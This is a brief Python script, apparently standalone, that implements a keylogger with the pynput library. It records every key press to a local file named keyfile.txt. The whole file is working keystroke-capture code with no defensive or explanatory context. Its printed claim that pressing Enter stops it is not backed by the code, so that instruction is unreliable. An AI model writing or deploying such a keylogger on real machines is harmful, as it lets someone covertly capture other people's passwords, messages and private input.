from pynput import keyboard

def on_key_press(key):
    try:
        with open("keyfile.txt", "a") as log_file:
            if hasattr(key, 'char'):
                char = key.char
            elif key == keyboard.Key.space:
                char = ' '
            else:
                char = f' [{key}] '
            log_file.write(char)
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    try:
        with keyboard.Listener(on_press=on_key_press) as listener:
            print("Keylogger started. Press 'Enter' to stop.")
            listener.join()
    except KeyboardInterrupt:
        print("Keylogger stopped.")
    except Exception as e:
        print(f"Error: {e}")


